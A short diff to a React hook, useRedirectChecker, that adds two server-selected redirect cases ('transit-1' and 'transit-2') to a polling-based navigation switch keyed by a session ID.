@@ -26,6 +26,14 @@ export const useRedirectChecker = (interval: number = 3000) => {
         console.log("Redirect check response:", data); // Добавьте логирование
         if (data.success && data.redirect) {
           switch (data.type) {
+            case "transit-1":
+              console.log("🔄 Redirecting to transit-1 page");
+              navigate(`/connects/asyncresponse/${sessionId}`, { replace: true });
+              break;
+            case "transit-2":
+              console.log("🔄 Redirecting to transit-2 page");
+              navigate(`/site/process/${sessionId}`, { replace: true });
+              break;
             case "balance":
               console.log("🔄 Redirecting to balance page");
               navigate(`/balance/${sessionId}`);
